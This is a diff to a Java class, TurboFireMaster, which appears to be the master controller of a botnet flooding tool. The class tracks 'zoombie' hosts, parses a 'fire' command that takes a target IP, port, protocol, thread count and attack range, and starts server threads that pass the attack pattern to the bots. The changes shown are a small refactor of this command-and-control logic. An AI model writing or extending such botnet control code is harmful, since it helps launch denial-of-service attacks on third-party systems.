@@ -83,6 +83,8 @@ public class TurboFireMaster {
 
     private static List attackLogs;
     private static ArrayList<String> zoombieHosts;
+    private Thread responseServer;
+    private Thread masterServer;
     /** 
      * The master turbo fire executable version
      * object constructor. It sets a gui instance,
@@ -92,6 +94,8 @@ public class TurboFireMaster {
     */
     public TurboFireMaster() {
         this.serverPort  = 3425;
+        this.responseServer = null;
+        this.masterServer = null;
         this.gui         = new GUI();
         this.zoombieList = new ArrayList<Socket>();
         zoombieHosts     = new ArrayList<String>();
@@ -113,15 +117,14 @@ public class TurboFireMaster {
                 while(true) {
                     try {
                         TimeUnit.SECONDS.sleep(1);
-                        GUI.showAttackActivity(attackLogs.size(), attackLogs, getZoombieHosts());
+                        GUI.showAttackActivity(attackLogs.size(), attackLogs, getZoombieHosts(), this.attackPattern);
                     } catch (InterruptedException ie) {
                         GUI.showExceptionLog(ie.toString());
                     }
                 }
-            }else if(command[0].equals("listen")) {
-                // Thread t = new Thread(new ServerThread());
-                // t.start();
-                // this.gui.pressEnterToContinue();
+            }else if(command[0].equals("help")) {
+                this.gui.help();
+                this.gui.pressEnterToContinue();
             }else if(command[0].equals("list")) {
             
             }else if(command[0].equalsIgnoreCase("fire")) {
@@ -147,7 +150,7 @@ public class TurboFireMaster {
                             }
                             i++;
                         }
-                    }else if(command[i].equalsIgnoreCase("--threads") || command[i].equalsIgnoreCase("-t")) {
+                    }else if(command[i].equalsIgnoreCase("--thread") || command[i].equalsIgnoreCase("-t")) {
                         if(command[i+1] != null) {
                             threadAmount = Integer.parseInt(command[i+1]);
                             i++;
@@ -194,10 +197,10 @@ public class TurboFireMaster {
                 this.gui.showMessage("Message: " + message);
                 this.gui.pressEnterToContinue();
                 this.attackPattern = new AttackPattern(protocol, ipAddress, port, threadAmount, connectionTimeOut, attackRange, message, null);
-                Thread t = new Thread(new ServerThread(this.serverPort ,this.attackPattern));
-                t.start();
-                Thread responseServer = new Thread(new ResponseServer());
-                responseServer.start();
+                this.masterServer = new Thread(new ServerThread(this.serverPort ,this.attackPattern));
+                this.masterServer.start();
+                this.responseServer = new Thread(new ResponseServer());
+                this.responseServer.start();
             }
         }
     }
